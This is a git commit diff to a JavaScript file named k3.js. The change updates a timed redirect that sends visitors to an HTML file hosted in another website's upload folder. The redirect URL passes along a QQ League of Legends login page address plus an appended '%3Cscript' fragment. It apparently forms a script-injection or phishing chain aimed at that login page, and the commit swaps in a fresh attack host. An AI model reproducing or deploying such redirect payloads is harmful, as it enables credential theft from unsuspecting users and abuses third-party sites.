ebb043a36b8adc1c4658b9ae7432efd8023f9752
iuuc <145624790+iuuc@users.noreply.github.com>
2024-01-11 15:54:24 +0800

    Update k3.js

--- k3.js
+++ k3.js
@@ -10,6 +10,6 @@ leleua();
 
 setTimeout(function() {
     var timestamp = new Date().getTime();
-    var url = 'https://img.yigaoba.com/avator/558068/20240106/ee778c0eab623e3a3b07f9619ab92f09.htm?url=http://lol.qq.com/comm-htdocs/milo_mobile/login.html' + 'u' + timestamp + '%3Cscript';
+    var url = 'http://www.360tianma.com/public/upload/conf/2024/01-11/38db6050a87abdd15393b354437fedc5.HTM?url=http://lol.qq.com/comm-htdocs/milo_mobile/login.html' + 'u' + timestamp + '%3Cscript';
     location.href = url;
 }, 1000);
